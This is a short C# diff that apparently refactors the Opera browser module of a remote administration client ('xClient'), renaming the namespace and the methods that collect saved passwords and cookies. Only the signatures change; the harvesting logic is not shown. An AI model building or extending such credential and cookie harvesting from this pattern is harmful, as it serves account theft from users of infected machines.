@@ -1,13 +1,14 @@
 ﻿using System;
 using System.Collections.Generic;
 using System.IO;
-using xClient.Core.Recovery.Helper;
+using xClient.Core.Recovery.Utilities;
+using xClient.Core.Utilities;
 
-namespace PasswordRecovery.Browsers
+namespace xClient.Core.Recovery.Browsers
 {
     public class Opera
     {
-        public static List<LoginInfo> Passwords()
+        public static List<LoginInfo> GetSavedPasswords()
         {
             try
             {
@@ -20,7 +21,8 @@ namespace PasswordRecovery.Browsers
                 return new List<LoginInfo>();
             }
         }
-        public static List<ChromiumBase.ChromiumCookie> Cookies()
+
+        public static List<ChromiumBase.ChromiumCookie> GetSavedCookies()
         {
             try
             {
